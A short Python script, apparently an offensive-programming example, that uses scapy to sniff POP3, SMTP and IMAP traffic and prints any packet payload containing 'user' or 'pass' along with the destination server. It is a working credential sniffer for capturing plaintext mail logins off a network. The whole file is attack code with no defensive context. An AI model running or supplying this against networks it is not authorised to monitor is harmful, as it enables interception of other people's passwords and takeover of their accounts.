from scapy.all import *
from scapy.layers.inet import TCP, IP
# our packet callback



def packet_callback(packet):
    if packet[TCP].payload:

        mail_packet = str(packet[TCP].payload)

        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print("[*] Server: {0}".format(packet[IP].dst))
            print("[*] {0}".format(packet[TCP].payload))

# fire up our sniffer
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=0)